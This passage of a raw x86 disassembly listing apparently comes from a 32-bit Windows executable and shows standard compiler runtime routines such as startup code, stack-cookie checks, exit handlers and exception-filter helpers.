  406687:	lea    eax,[esi+esi*1]
  40668a:	push   eax
  40668b:	push   ebx
  40668c:	push   edi
  40668d:	call   0x4072a0
  406692:	mov    ecx,DWORD PTR [ebp+0xc]
  406695:	add    esp,0xc
  406698:	test   ecx,ecx
  40669a:	je     0x4066a7
  40669c:	xor    eax,eax
  40669e:	inc    eax
  40669f:	cmp    eax,esi
  4066a1:	sbb    eax,eax
  4066a3:	and    eax,edi
  4066a5:	mov    DWORD PTR [ecx],eax
  4066a7:	cmp    esi,DWORD PTR [ebp-0x8]
  4066aa:	jae    0x4066b7
  4066ac:	test   esi,esi
  4066ae:	je     0x4066b7
  4066b0:	xor    eax,eax
  4066b2:	mov    WORD PTR [edi+esi*2-0x2],ax
  4066b7:	lea    eax,[edi+esi*2]
  4066ba:	pop    edi
  4066bb:	pop    esi
  4066bc:	pop    ebx
  4066bd:	mov    esp,ebp
  4066bf:	pop    ebp
  4066c0:	ret    0x8
  4066c3:	int3   
  4066c4:	int3   
  4066c5:	int3   
  4066c6:	int3   
  4066c7:	int3   
  4066c8:	mov    edi,edi
  4066ca:	push   ebp
  4066cb:	mov    ebp,esp
  4066cd:	push   ecx
  4066ce:	push   ecx
  4066cf:	push   ebx
  4066d0:	mov    ebx,DWORD PTR [ebp+0x8]
  4066d3:	mov    BYTE PTR [ebp-0x1],0x0
  4066d7:	push   esi
  4066d8:	mov    esi,edx
  4066da:	push   edi
  4066db:	mov    edi,ecx
  4066dd:	test   ebx,ebx
  4066df:	jne    0x4066e4
  4066e1:	lea    ebx,[ebp-0x1]
  4066e4:	mov    ecx,ebx
  4066e6:	call   0x403fcd
  4066eb:	sub    esi,edi
  4066ed:	mov    DWORD PTR [ebp-0x8],eax
  4066f0:	cmp    eax,esi
  4066f2:	jae    0x4066f6
  4066f4:	mov    esi,eax
  4066f6:	push   esi
  4066f7:	push   ebx
  4066f8:	push   edi
  4066f9:	call   0x4072a0
  4066fe:	mov    ecx,DWORD PTR [ebp+0xc]
  406701:	add    esp,0xc
  406704:	test   ecx,ecx
  406706:	je     0x406713
  406708:	xor    eax,eax
  40670a:	inc    eax
  40670b:	cmp    eax,esi
  40670d:	sbb    eax,eax
  40670f:	and    eax,edi
  406711:	mov    DWORD PTR [ecx],eax
  406713:	cmp    esi,DWORD PTR [ebp-0x8]
  406716:	jae    0x406721
  406718:	test   esi,esi
  40671a:	je     0x406721
  40671c:	mov    BYTE PTR [esi+edi*1-0x1],0x0
  406721:	lea    eax,[esi+edi*1]
  406724:	pop    edi
  406725:	pop    esi
  406726:	pop    ebx
  406727:	mov    esp,ebp
  406729:	pop    ebp
  40672a:	ret    0x8
  40672d:	int3   
  40672e:	int3   
  40672f:	int3   
  406730:	int3   
  406731:	int3   
  406732:	mov    edi,edi
  406734:	push   ebp
  406735:	mov    ebp,esp
  406737:	and    esp,0xfffffff8
  40673a:	sub    esp,0x3c
  40673d:	mov    eax,ds:0x408004
  406742:	xor    eax,esp
  406744:	mov    DWORD PTR [esp+0x38],eax
  406748:	push   ebx
  406749:	mov    ebx,DWORD PTR [ebp+0x8]
  40674c:	push   esi
  40674d:	push   edi
  40674e:	mov    edi,ecx
  406750:	mov    eax,DWORD PTR [edi+0x18]
  406753:	mov    esi,DWORD PTR [eax+0x28]
  406756:	cmp    DWORD PTR [esi],0x5
  406759:	jbe    0x406794
  40675b:	push   0x2000
  406760:	push   0x0
  406762:	mov    ecx,esi
  406764:	call   0x402718
  406769:	test   al,al
  40676b:	je     0x406794
  40676d:	mov    edx,DWORD PTR [ebx]
  40676f:	lea    ecx,[esp+0x30]
  406773:	call   0x402789
  406778:	lea    eax,[esp+0x10]
  40677c:	mov    edx,0x40183f
  406781:	push   eax
  406782:	mov    eax,DWORD PTR [edi+0x18]
  406785:	mov    ecx,esi
  406787:	push   0x3
  406789:	push   0x0
  40678b:	add    eax,0x8
  40678e:	push   eax
  40678f:	call   0x402687
  406794:	mov    ecx,DWORD PTR [esp+0x44]
  406798:	pop    edi
  406799:	pop    esi
  40679a:	pop    ebx
  40679b:	xor    ecx,esp
  40679d:	call   0x406b70
  4067a2:	mov    esp,ebp
  4067a4:	pop    ebp
  4067a5:	ret    0x4
  4067a8:	int3   
  4067a9:	int3   
  4067aa:	int3   
  4067ab:	int3   
  4067ac:	int3   
  4067ad:	mov    edi,edi
  4067af:	push   ebp
  4067b0:	mov    ebp,esp
  4067b2:	and    esp,0xfffffff8
  4067b5:	sub    esp,0x2c
  4067b8:	mov    eax,ds:0x408004
  4067bd:	xor    eax,esp
  4067bf:	mov    DWORD PTR [esp+0x28],eax
  4067c3:	cmp    DWORD PTR [ecx],0x5
  4067c6:	push   esi
  4067c7:	mov    esi,edx
  4067c9:	jbe    0x4067ef
  4067cb:	push   0x2000
  4067d0:	push   0x0
  4067d2:	call   0x402718
  4067d7:	test   al,al
  4067d9:	je     0x4067ef
  4067db:	lea    eax,[esp+0x8]
  4067df:	mov    edx,0x402153
  4067e4:	push   eax
  4067e5:	push   0x2
  4067e7:	push   0x0
  4067e9:	push   esi
  4067ea:	call   0x402687
  4067ef:	mov    ecx,DWORD PTR [esp+0x2c]
  4067f3:	pop    esi
  4067f4:	xor    ecx,esp
  4067f6:	call   0x406b70
  4067fb:	mov    esp,ebp
  4067fd:	pop    ebp
  4067fe:	ret    
  4067ff:	int3   
  406800:	int3   
  406801:	int3   
  406802:	int3   
  406803:	int3   
  406804:	int3   
  406805:	int3   
  406806:	int3   
  406807:	int3   
  406808:	int3   
  406809:	int3   
  40680a:	int3   
  40680b:	int3   
  40680c:	int3   
  40680d:	int3   
  40680e:	int3   
  40680f:	int3   
  406810:	mov    eax,0x5a4d
  406815:	cmp    WORD PTR ds:0x400000,ax
  40681c:	je     0x406822
  40681e:	xor    eax,eax
  406820:	jmp    0x406870
  406822:	mov    ecx,DWORD PTR ds:0x40003c
  406828:	cmp    DWORD PTR [ecx+0x400000],0x4550
  406832:	jne    0x40681e
  406834:	movzx  eax,WORD PTR [ecx+0x400018]
  40683b:	cmp    eax,0x10b
  406840:	je     0x40685c
  406842:	cmp    eax,0x20b
  406847:	jne    0x40681e
  406849:	xor    eax,eax
  40684b:	cmp    DWORD PTR [ecx+0x400084],0xe
  406852:	jbe    0x406870
  406854:	cmp    DWORD PTR [ecx+0x4000f8],eax
  40685a:	jmp    0x40686d
  40685c:	xor    eax,eax
  40685e:	cmp    DWORD PTR [ecx+0x400074],0xe
  406865:	jbe    0x406870
  406867:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40686d:	setne  al
  406870:	push   0x2
  406872:	mov    ds:0x408090,eax
  406877:	call   0x406ebe
  40687c:	push   eax
  40687d:	call   DWORD PTR ds:0x4091dc
  406883:	or     DWORD PTR ds:0x4084f0,0xffffffff
  40688a:	or     DWORD PTR ds:0x4084f4,0xffffffff
  406891:	pop    ecx
  406892:	pop    ecx
  406893:	call   DWORD PTR ds:0x4091f0
  406899:	mov    ecx,DWORD PTR ds:0x4083c0
  40689f:	mov    DWORD PTR [eax],ecx
  4068a1:	call   DWORD PTR ds:0x4091d0
  4068a7:	mov    ecx,DWORD PTR ds:0x4083b4
  4068ad:	mov    DWORD PTR [eax],ecx
  4068af:	call   0x407110
  4068b4:	cmp    DWORD PTR ds:0x408000,0x0
  4068bb:	jne    0x4068c9
  4068bd:	push   0x407110
  4068c2:	call   DWORD PTR ds:0x4091fc
  4068c8:	pop    ecx
  4068c9:	call   0x407118
  4068ce:	xor    eax,eax
  4068d0:	ret    
  4068d1:	int3   
  4068d2:	int3   
  4068d3:	int3   
  4068d4:	int3   
  4068d5:	int3   
  4068d6:	int3   
  4068d7:	int3   
  4068d8:	int3   
  4068d9:	int3   
  4068da:	int3   
  4068db:	int3   
  4068dc:	int3   
  4068dd:	int3   
  4068de:	int3   
  4068df:	int3   
  4068e0:	mov    eax,ds:0x4083bc
  4068e5:	push   0x408094
  4068ea:	push   DWORD PTR ds:0x4083b8
  4068f0:	mov    ds:0x408094,eax
  4068f5:	push   0x408088
  4068fa:	push   0x408084
  4068ff:	push   0x408080
  406904:	call   DWORD PTR ds:0x4091d8
  40690a:	add    esp,0x14
  40690d:	mov    ds:0x40808c,eax
  406912:	ret    
  406913:	int3   
  406914:	int3   
  406915:	int3   
  406916:	int3   
  406917:	int3   
  406918:	int3   
  406919:	int3   
  40691a:	int3   
  40691b:	int3   
  40691c:	int3   
  40691d:	int3   
  40691e:	int3   
  40691f:	int3   
  406920:	call   0x407068
  406925:	jmp    0x40692f
  40692a:	int3   
  40692b:	int3   
  40692c:	int3   
  40692d:	int3   
  40692e:	int3   
  40692f:	push   0x5c
  406931:	push   0x4073a8
  406936:	call   0x40713c
  40693b:	and    DWORD PTR [ebp-0x24],0x0
  40693f:	and    DWORD PTR [ebp-0x4],0x0
  406943:	lea    eax,[ebp-0x6c]
  406946:	push   eax
  406947:	call   DWORD PTR ds:0x4090c4
  40694d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406954:	xor    ebx,ebx
  406956:	inc    ebx
  406957:	mov    DWORD PTR [ebp-0x4],ebx
  40695a:	mov    eax,fs:0x18
  406960:	mov    edi,DWORD PTR [eax+0x4]
  406963:	xor    esi,esi
  406965:	mov    edx,0x4084e8
  40696a:	mov    ecx,edi
  40696c:	xor    eax,eax
  40696e:	lock cmpxchg DWORD PTR [edx],ecx
  406972:	test   eax,eax
  406974:	je     0x40697c
  406976:	cmp    eax,edi
  406978:	jne    0x40698e
  40697a:	mov    esi,ebx
  40697c:	cmp    DWORD PTR ds:0x4084ec,ebx
  406982:	jne    0x40699b
  406984:	push   0x1f
  406986:	call   0x406efa
  40698b:	pop    ecx
  40698c:	jmp    0x4069ca
  40698e:	push   0x3e8
  406993:	call   DWORD PTR ds:0x409180
  406999:	jmp    0x406965
  40699b:	cmp    DWORD PTR ds:0x4084ec,0x0
  4069a2:	jne    0x4069c4
  4069a4:	mov    DWORD PTR ds:0x4084ec,ebx
  4069aa:	push   0x401020
  4069af:	push   0x401014
  4069b4:	call   0x406b1a
  4069b9:	pop    ecx
  4069ba:	pop    ecx
  4069bb:	test   eax,eax
  4069bd:	je     0x4069ca
  4069bf:	jmp    0x406b03
  4069c4:	mov    DWORD PTR ds:0x40807c,ebx
  4069ca:	cmp    DWORD PTR ds:0x4084ec,ebx
  4069d0:	jne    0x4069ed
  4069d2:	push   0x401010
  4069d7:	push   0x401000
  4069dc:	call   0x407130
  4069e1:	pop    ecx
  4069e2:	pop    ecx
  4069e3:	mov    DWORD PTR ds:0x4084ec,0x2
  4069ed:	test   esi,esi
  4069ef:	jne    0x4069fa
  4069f1:	xor    eax,eax
  4069f3:	mov    ecx,0x4084e8
  4069f8:	xchg   DWORD PTR [ecx],eax
  4069fa:	cmp    DWORD PTR ds:0x4084f8,0x0
  406a01:	je     0x406a28
  406a03:	push   0x4084f8
  406a08:	call   0x406f60
  406a0d:	pop    ecx
  406a0e:	test   eax,eax
  406a10:	je     0x406a28
  406a12:	push   0x0
  406a14:	push   0x2
  406a16:	push   0x0
  406a18:	mov    esi,DWORD PTR ds:0x4084f8
  406a1e:	mov    ecx,esi
  406a20:	call   DWORD PTR ds:0x409210
  406a26:	call   esi
  406a28:	mov    eax,ds:0x4091a0
  406a2d:	mov    esi,DWORD PTR [eax]
  406a2f:	mov    DWORD PTR [ebp-0x20],esi
  406a32:	mov    edi,DWORD PTR [ebp-0x24]
  406a35:	mov    cl,BYTE PTR [esi]
  406a37:	cmp    cl,0x20
  406a3a:	ja     0x406a86
  406a3c:	test   cl,cl
  406a3e:	je     0x406a44
  406a40:	test   edi,edi
  406a42:	jne    0x406a86
  406a44:	mov    al,BYTE PTR [esi]
  406a46:	test   al,al
  406a48:	je     0x406a54
  406a4a:	cmp    al,0x20
  406a4c:	ja     0x406a54
  406a4e:	inc    esi
  406a4f:	mov    DWORD PTR [ebp-0x20],esi
  406a52:	jmp    0x406a44
  406a54:	test   BYTE PTR [ebp-0x40],0x1
  406a58:	je     0x406a60
  406a5a:	movzx  eax,WORD PTR [ebp-0x3c]
  406a5e:	jmp    0x406a63
  406a60:	push   0xa
  406a62:	pop    eax
  406a63:	push   eax
  406a64:	push   esi
  406a65:	push   0x0
  406a67:	push   0x400000
  406a6c:	call   0x403a02
  406a71:	mov    ds:0x408078,eax
  406a76:	cmp    DWORD PTR ds:0x408090,0x0
  406a7d:	jne    0x406adf
  406a7f:	push   eax
  406a80:	call   DWORD PTR ds:0x4091e0
  406a86:	cmp    cl,0x22
  406a89:	jne    0x406a97
  406a8b:	xor    eax,eax
  406a8d:	test   edi,edi
  406a8f:	sete   al
  406a92:	mov    edi,eax
  406a94:	mov    DWORD PTR [ebp-0x24],edi
  406a97:	movzx  eax,cl
  406a9a:	push   eax
  406a9b:	call   DWORD PTR ds:0x4091f8
  406aa1:	pop    ecx
  406aa2:	test   eax,eax
  406aa4:	je     0x406aaa
  406aa6:	inc    esi
  406aa7:	mov    DWORD PTR [ebp-0x20],esi
  406aaa:	inc    esi
  406aab:	mov    DWORD PTR [ebp-0x20],esi
  406aae:	jmp    0x406a35
  406ab0:	mov    ecx,DWORD PTR [ebp-0x14]
  406ab3:	mov    eax,DWORD PTR [ecx]
  406ab5:	mov    eax,DWORD PTR [eax]
  406ab7:	mov    DWORD PTR [ebp-0x28],eax
  406aba:	push   ecx
  406abb:	push   eax
  406abc:	call   0x406e44
  406ac1:	pop    ecx
  406ac2:	pop    ecx
  406ac3:	ret    
  406ac4:	mov    esp,DWORD PTR [ebp-0x18]
  406ac7:	mov    eax,DWORD PTR [ebp-0x28]
  406aca:	mov    ds:0x408078,eax
  406acf:	cmp    DWORD PTR ds:0x408090,0x0
  406ad6:	jne    0x406adf
  406ad8:	push   eax
  406ad9:	call   DWORD PTR ds:0x4091e4
  406adf:	cmp    DWORD PTR ds:0x40807c,0x0
  406ae6:	jne    0x406af3
  406ae8:	call   DWORD PTR ds:0x4091e8
  406aee:	mov    eax,ds:0x408078
  406af3:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406afa:	jmp    0x406b0f
  406afc:	xor    eax,eax
  406afe:	inc    eax
  406aff:	ret    
  406b00:	mov    esp,DWORD PTR [ebp-0x18]
  406b03:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406b0a:	mov    eax,0xff
  406b0f:	call   0x407184
  406b14:	ret    
  406b15:	int3   
  406b16:	int3   
  406b17:	int3   
  406b18:	int3   
  406b19:	int3   
  406b1a:	mov    edi,edi
  406b1c:	push   ebp
  406b1d:	mov    ebp,esp
  406b1f:	push   ecx
  406b20:	mov    eax,ds:0x408004
  406b25:	xor    eax,ebp
  406b27:	mov    DWORD PTR [ebp-0x4],eax
  406b2a:	push   esi
  406b2b:	mov    esi,DWORD PTR [ebp+0x8]
  406b2e:	xor    eax,eax
  406b30:	cmp    esi,DWORD PTR [ebp+0xc]
  406b33:	jae    0x406b53
  406b35:	push   edi
  406b36:	test   eax,eax
  406b38:	jne    0x406b52
  406b3a:	mov    edi,DWORD PTR [esi]
  406b3c:	test   edi,edi
  406b3e:	je     0x406b4a
  406b40:	mov    ecx,edi
  406b42:	call   DWORD PTR ds:0x409210
  406b48:	call   edi
  406b4a:	add    esi,0x4
  406b4d:	cmp    esi,DWORD PTR [ebp+0xc]
  406b50:	jb     0x406b36
  406b52:	pop    edi
  406b53:	mov    ecx,DWORD PTR [ebp-0x4]
  406b56:	xor    ecx,ebp
  406b58:	pop    esi
  406b59:	call   0x406b70
  406b5e:	mov    esp,ebp
  406b60:	pop    ebp
  406b61:	ret    
  406b62:	int3   
  406b63:	int3   
  406b64:	int3   
  406b65:	int3   
  406b66:	int3   
  406b67:	int3   
  406b68:	int3   
  406b69:	int3   
  406b6a:	int3   
  406b6b:	int3   
  406b6c:	int3   
  406b6d:	int3   
  406b6e:	int3   
  406b6f:	int3   
  406b70:	cmp    ecx,DWORD PTR ds:0x408004
  406b76:	jne    0x406b7b
  406b78:	ret    0x0
  406b7b:	jmp    0x406bb4
  406b80:	int3   
  406b81:	int3   
  406b82:	int3   
  406b83:	int3   
  406b84:	int3   
  406b85:	mov    edi,edi
  406b87:	push   ebp
  406b88:	mov    ebp,esp
  406b8a:	push   0x0
  406b8c:	call   DWORD PTR ds:0x409158
  406b92:	push   DWORD PTR [ebp+0x8]
  406b95:	call   DWORD PTR ds:0x409154
  406b9b:	push   0xc0000409
  406ba0:	call   DWORD PTR ds:0x409170
  406ba6:	push   eax
  406ba7:	call   DWORD PTR ds:0x40916c
  406bad:	pop    ebp
  406bae:	ret    
  406baf:	int3   
  406bb0:	int3   
  406bb1:	int3   
  406bb2:	int3   
  406bb3:	int3   
  406bb4:	mov    edi,edi
  406bb6:	push   ebp
  406bb7:	mov    ebp,esp
  406bb9:	sub    esp,0x324
  406bbf:	mov    ds:0x408198,eax
  406bc4:	mov    DWORD PTR ds:0x408194,ecx
  406bca:	mov    DWORD PTR ds:0x408190,edx
  406bd0:	mov    DWORD PTR ds:0x40818c,ebx
  406bd6:	mov    DWORD PTR ds:0x408188,esi
  406bdc:	mov    DWORD PTR ds:0x408184,edi
  406be2:	data16 mov WORD PTR ds:0x4081b0,ss
  406be9:	data16 mov WORD PTR ds:0x4081a4,cs
  406bf0:	data16 mov WORD PTR ds:0x408180,ds
  406bf7:	data16 mov WORD PTR ds:0x40817c,es
  406bfe:	data16 mov WORD PTR ds:0x408178,fs
  406c05:	data16 mov WORD PTR ds:0x408174,gs
  406c0c:	pushf  
  406c0d:	pop    DWORD PTR ds:0x4081a8
  406c13:	mov    eax,DWORD PTR [ebp+0x0]
  406c16:	mov    ds:0x40819c,eax
  406c1b:	mov    eax,DWORD PTR [ebp+0x4]
  406c1e:	mov    ds:0x4081a0,eax
  406c23:	lea    eax,[ebp+0x8]
  406c26:	mov    ds:0x4081ac,eax
  406c2b:	mov    eax,DWORD PTR [ebp-0x324]
  406c31:	mov    DWORD PTR ds:0x4080e8,0x10001
  406c3b:	mov    eax,ds:0x4081a0
  406c40:	mov    ds:0x4080a4,eax
  406c45:	mov    DWORD PTR ds:0x408098,0xc0000409
  406c4f:	mov    DWORD PTR ds:0x40809c,0x1
  406c59:	mov    DWORD PTR ds:0x4080a8,0x3
  406c63:	push   0x4
  406c65:	pop    eax
  406c66:	imul   eax,eax,0x0
  406c69:	mov    DWORD PTR [eax+0x4080ac],0x2
  406c73:	push   0x4
  406c75:	pop    eax
  406c76:	shl    eax,0x0
  406c79:	mov    ecx,DWORD PTR ds:0x408004
  406c7f:	mov    DWORD PTR [eax+0x4080ac],ecx
  406c85:	push   0x4
  406c87:	pop    eax
  406c88:	shl    eax,1
  406c8a:	mov    ecx,DWORD PTR ds:0x408008
  406c90:	mov    DWORD PTR [eax+0x4080ac],ecx
  406c96:	push   0x4
  406c98:	pop    eax
  406c99:	imul   eax,eax,0x0
  406c9c:	mov    ecx,DWORD PTR ds:0x408004
  406ca2:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  406ca6:	push   0x4
  406ca8:	pop    eax
  406ca9:	shl    eax,0x0
  406cac:	mov    ecx,DWORD PTR ds:0x408008
  406cb2:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  406cb6:	push   0x4010b0
  406cbb:	call   0x406b85
  406cc0:	mov    esp,ebp
  406cc2:	pop    ebp
  406cc3:	ret    
  406cc4:	int3   
  406cc5:	int3   
  406cc6:	int3   
  406cc7:	int3   
  406cc8:	int3   
  406cc9:	push   0x18
  406ccb:	push   0x4073d0
  406cd0:	call   0x40713c
  406cd5:	and    DWORD PTR [ebp-0x28],0x0
  406cd9:	mov    eax,ds:0x4084f4
  406cde:	mov    DWORD PTR [ebp-0x20],eax
  406ce1:	cmp    eax,0xffffffff
  406ce4:	jne    0x406cfc
  406ce6:	push   DWORD PTR [ebp+0x8]
  406ce9:	mov    esi,DWORD PTR ds:0x40919c
  406cef:	mov    ecx,esi
  406cf1:	call   DWORD PTR ds:0x409210
  406cf7:	call   esi
  406cf9:	pop    ecx
  406cfa:	jmp    0x406d50
  406cfc:	push   0x8
  406cfe:	call   0x4071ca
  406d03:	pop    ecx
  406d04:	and    DWORD PTR [ebp-0x4],0x0
  406d08:	mov    eax,ds:0x4084f4
  406d0d:	mov    DWORD PTR [ebp-0x20],eax
  406d10:	mov    eax,ds:0x4084f0
  406d15:	mov    DWORD PTR [ebp-0x24],eax
  406d18:	lea    eax,[ebp-0x24]
  406d1b:	push   eax
  406d1c:	lea    eax,[ebp-0x20]
  406d1f:	push   eax
  406d20:	push   DWORD PTR [ebp+0x8]
  406d23:	call   0x4071e2
  406d28:	add    esp,0xc
  406d2b:	mov    esi,eax
  406d2d:	mov    DWORD PTR [ebp-0x28],esi
  406d30:	mov    ecx,DWORD PTR [ebp-0x20]
  406d33:	mov    DWORD PTR ds:0x4084f4,ecx
  406d39:	mov    ecx,DWORD PTR [ebp-0x24]
  406d3c:	mov    DWORD PTR ds:0x4084f0,ecx
  406d42:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406d49:	call   0x406d59
  406d4e:	mov    eax,esi
  406d50:	call   0x407184
  406d55:	ret    
  406d56:	mov    esi,DWORD PTR [ebp-0x28]
  406d59:	push   0x8
  406d5b:	call   0x4071d6
  406d60:	pop    ecx
  406d61:	ret    
  406d62:	int3   
  406d63:	int3   
  406d64:	int3   
  406d65:	int3   
  406d66:	int3   
  406d67:	mov    edi,edi
  406d69:	push   ebp
  406d6a:	mov    ebp,esp
  406d6c:	push   DWORD PTR [ebp+0x8]
  406d6f:	call   0x406cc9
  406d74:	neg    eax
  406d76:	pop    ecx
  406d77:	sbb    eax,eax
  406d79:	neg    eax
  406d7b:	dec    eax
  406d7c:	pop    ebp
  406d7d:	ret    
  406d7e:	int3   
  406d7f:	int3   
  406d80:	int3   
  406d81:	int3   
  406d82:	int3   
  406d83:	int3   
  406d84:	int3   
  406d85:	int3   
  406d86:	int3   
  406d87:	int3   
  406d88:	int3   
  406d89:	int3   
  406d8a:	int3   
  406d8b:	int3   
  406d8c:	int3   
  406d8d:	int3   
  406d8e:	int3   
  406d8f:	int3   
  406d90:	jmp    DWORD PTR ds:0x4091c0
  406d96:	int3   
  406d97:	int3   
  406d98:	int3   
  406d99:	int3   
  406d9a:	int3   
  406d9b:	int3   
  406d9c:	jmp    DWORD PTR ds:0x4091c4
  406da2:	int3   
  406da3:	int3   
  406da4:	int3   
  406da5:	int3   
  406da6:	int3   
  406da7:	int3   
  406da8:	int3   
  406da9:	int3   
  406daa:	int3   
  406dab:	int3   
  406dac:	int3   
  406dad:	int3   
  406dae:	int3   
  406daf:	int3   
  406db0:	mov    edi,edi
  406db2:	push   ebp
  406db3:	mov    ebp,esp
  406db5:	push   esi
  406db6:	mov    esi,ecx
  406db8:	call   DWORD PTR ds:0x4091a8
  406dbe:	test   BYTE PTR [ebp+0x8],0x1
  406dc2:	je     0x406dcb
  406dc4:	push   esi
  406dc5:	call   0x406d9c
  406dca:	pop    ecx
  406dcb:	mov    eax,esi
  406dcd:	pop    esi
  406dce:	pop    ebp
  406dcf:	ret    0x4
  406dd2:	int3   
  406dd3:	int3   
  406dd4:	int3   
  406dd5:	int3   
  406dd6:	int3   
  406dd7:	int3   
  406dd8:	int3   
  406dd9:	int3   
  406dda:	int3   
  406ddb:	int3   
  406ddc:	int3   
  406ddd:	int3   
  406dde:	int3   
  406ddf:	int3   
  406de0:	mov    edi,edi
  406de2:	push   ebp
  406de3:	mov    ebp,esp
  406de5:	mov    eax,DWORD PTR [ebp+0x8]
  406de8:	mov    eax,DWORD PTR [eax]
  406dea:	cmp    DWORD PTR [eax],0xe06d7363
  406df0:	jne    0x406e1d
  406df2:	cmp    DWORD PTR [eax+0x10],0x3
  406df6:	jne    0x406e1d
  406df8:	mov    eax,DWORD PTR [eax+0x14]
  406dfb:	cmp    eax,0x19930520
  406e00:	je     0x406e17
  406e02:	cmp    eax,0x19930521
  406e07:	je     0x406e17
  406e09:	cmp    eax,0x19930522
  406e0e:	je     0x406e17
  406e10:	cmp    eax,0x1994000
  406e15:	jne    0x406e1d
  406e17:	call   DWORD PTR ds:0x4091ac
  406e1d:	xor    eax,eax
  406e1f:	pop    ebp
  406e20:	ret    0x4
  406e23:	int3   
  406e24:	int3   
  406e25:	int3   
  406e26:	int3   
  406e27:	int3   
  406e28:	int3   
  406e29:	int3   
  406e2a:	int3   
  406e2b:	int3   
  406e2c:	int3   
  406e2d:	int3   
  406e2e:	int3   
  406e2f:	int3   
  406e30:	push   0x406de0
  406e35:	call   DWORD PTR ds:0x409158
  406e3b:	xor    eax,eax
  406e3d:	ret    
  406e3e:	int3   
  406e3f:	int3   
  406e40:	int3   
  406e41:	int3   
  406e42:	int3   
  406e43:	int3   
  406e44:	jmp    DWORD PTR ds:0x4091cc
  406e4a:	int3   
  406e4b:	int3   
  406e4c:	int3   
  406e4d:	int3   
  406e4e:	int3   
  406e4f:	push   0xc
  406e51:	push   0x4073f0
  406e56:	call   0x4071f0
  406e5b:	xor    ecx,ecx
  406e5d:	mov    eax,DWORD PTR [ebp+0x8]
  406e60:	test   eax,eax
  406e62:	je     0x406eaf
  406e64:	cmp    eax,0xffffffff
  406e67:	je     0x406eaf
  406e69:	mov    DWORD PTR [ebp-0x4],ecx
  406e6c:	mov    edx,0x5a4d
  406e71:	cmp    WORD PTR [eax],dx
  406e74:	jne    0x406ea8
  406e76:	mov    edx,DWORD PTR [eax+0x3c]
  406e79:	test   edx,edx
  406e7b:	js     0x406ea8
  406e7d:	cmp    edx,0x10000000
  406e83:	jae    0x406ea8
  406e85:	add    eax,edx
  406e87:	mov    DWORD PTR [ebp-0x1c],eax
  406e8a:	mov    ecx,DWORD PTR [eax]
  406e8c:	sub    ecx,0x4550
  406e92:	neg    ecx
  406e94:	sbb    ecx,ecx
  406e96:	not    ecx
  406e98:	and    ecx,eax
  406e9a:	jmp    0x406ea5
  406e9c:	xor    eax,eax
  406e9e:	inc    eax
  406e9f:	ret    
  406ea0:	mov    esp,DWORD PTR [ebp-0x18]
  406ea3:	xor    ecx,ecx
  406ea5:	mov    DWORD PTR [ebp-0x1c],ecx
  406ea8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406eaf:	mov    eax,ecx
  406eb1:	call   0x407235
  406eb6:	ret    0x4
  406eb9:	int3   
  406eba:	int3   
  406ebb:	int3   
  406ebc:	int3   
  406ebd:	int3   
  406ebe:	mov    edi,edi
  406ec0:	push   ebp
  406ec1:	mov    ebp,esp
  406ec3:	push   0x0
  406ec5:	call   DWORD PTR ds:0x409160
  406ecb:	test   eax,eax
  406ecd:	je     0x406eef
  406ecf:	push   eax
  406ed0:	call   0x406e4f
  406ed5:	test   eax,eax
  406ed7:	je     0x406eef
  406ed9:	movzx  ecx,WORD PTR [eax+0x5c]
  406edd:	push   0x2
  406edf:	pop    eax
  406ee0:	cmp    cx,ax
  406ee3:	je     0x406ef2
  406ee5:	cmp    ecx,0x3
  406ee8:	jne    0x406eef
  406eea:	xor    eax,eax
  406eec:	inc    eax
  406eed:	pop    ebp
  406eee:	ret    
  406eef:	mov    eax,DWORD PTR [ebp+0x8]
  406ef2:	pop    ebp
  406ef3:	ret    
  406ef4:	int3   
  406ef5:	int3   
  406ef6:	int3   
  406ef7:	int3   
  406ef8:	int3   
  406ef9:	int3   
  406efa:	jmp    DWORD PTR ds:0x4091d4
  406f00:	int3   
  406f01:	int3   
  406f02:	int3   
  406f03:	int3   
  406f04:	int3   
  406f05:	int3   
  406f06:	int3   
  406f07:	int3   
  406f08:	int3   
  406f09:	int3   
  406f0a:	int3   
  406f0b:	int3   
  406f0c:	int3   
  406f0d:	int3   
  406f0e:	int3   
  406f0f:	int3   
  406f10:	mov    edi,edi
  406f12:	push   ebp
  406f13:	mov    ebp,esp
  406f15:	mov    eax,DWORD PTR [ebp+0x8]
  406f18:	xor    edx,edx
  406f1a:	push   ebx
  406f1b:	push   esi
  406f1c:	push   edi
  406f1d:	mov    ecx,DWORD PTR [eax+0x3c]
  406f20:	add    ecx,eax
  406f22:	movzx  eax,WORD PTR [ecx+0x14]
  406f26:	movzx  ebx,WORD PTR [ecx+0x6]
  406f2a:	add    eax,0x18
  406f2d:	add    eax,ecx
  406f2f:	test   ebx,ebx
  406f31:	je     0x406f4e
  406f33:	mov    edi,DWORD PTR [ebp+0xc]
  406f36:	mov    esi,DWORD PTR [eax+0xc]
  406f39:	cmp    edi,esi
  406f3b:	jb     0x406f46
  406f3d:	mov    ecx,DWORD PTR [eax+0x8]
  406f40:	add    ecx,esi
  406f42:	cmp    edi,ecx
  406f44:	jb     0x406f50
  406f46:	inc    edx
  406f47:	add    eax,0x28
  406f4a:	cmp    edx,ebx
  406f4c:	jb     0x406f36
  406f4e:	xor    eax,eax
  406f50:	pop    edi
  406f51:	pop    esi
  406f52:	pop    ebx
  406f53:	pop    ebp
  406f54:	ret    
  406f55:	int3   
  406f56:	int3   
  406f57:	int3   
  406f58:	int3   
  406f59:	int3   
  406f5a:	int3   
  406f5b:	int3   
  406f5c:	int3   
  406f5d:	int3   
  406f5e:	int3   
  406f5f:	int3   
  406f60:	mov    edi,edi
  406f62:	push   ebp
  406f63:	mov    ebp,esp
  406f65:	push   0xfffffffe
  406f67:	push   0x407410
  406f6c:	push   0x4071a0
  406f71:	mov    eax,fs:0x0
  406f77:	push   eax
  406f78:	sub    esp,0x8
  406f7b:	push   ebx
  406f7c:	push   esi
  406f7d:	push   edi
  406f7e:	mov    eax,ds:0x408004
  406f83:	xor    DWORD PTR [ebp-0x8],eax
  406f86:	xor    eax,ebp
  406f88:	push   eax
  406f89:	lea    eax,[ebp-0x10]
  406f8c:	mov    fs:0x0,eax
  406f92:	mov    DWORD PTR [ebp-0x18],esp
